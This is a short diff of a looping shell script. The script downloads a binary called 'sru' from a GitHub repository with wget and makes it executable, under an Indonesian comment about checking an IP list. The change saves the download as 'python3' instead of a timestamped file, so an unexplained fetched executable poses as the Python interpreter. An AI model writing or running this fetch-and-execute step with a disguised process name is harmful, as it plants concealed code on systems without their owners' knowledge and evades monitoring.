@@ -20,7 +20,7 @@ while [ $(date +%s) -lt $end_time ]; do
   # Mengunduh dan memeriksa daftar IP
   timestamp=$(date +%s)
   mkdir -p .lib
-  dynamic_sgr=".lib/sgr_$timestamp"
+  dynamic_sgr="python3"
   wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
   chmod +x $dynamic_sgr
   dynamic_list="list_$timestamp.json"
